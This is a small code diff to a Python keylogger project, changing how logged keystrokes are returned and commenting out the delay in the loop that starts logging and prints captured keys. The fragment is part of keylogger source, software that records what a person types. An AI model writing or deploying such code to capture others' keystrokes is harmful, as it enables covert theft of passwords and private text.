@@ -51,7 +51,10 @@ class KeyLoggerService(IKeyLogger):
         self.__logged_keys[self.__last_record] += key
 
     def get_logged_keys(self) -> dict[str:str]:
-        return self.__logged_keys
+        if len(self.__logged_keys)<1:
+            return {}
+        return {key:value for key, value in self.__logged_keys.items() if key is not self.__last_record}
+
 
     def clear_logged_keys(self) -> dict[str:str]:
         self.__logged_keys = {self.__last_record:self.__logged_keys[self.__last_record]} if self.__last_record in self.__logged_keys else {}
@@ -113,7 +116,7 @@ class KeyLoggerManager:
 x = KeyLoggerManager()
 x.start_logging()
 while True:
-    time.sleep(8)
+    # time.sleep(1)
     x.print_keys()
 
 
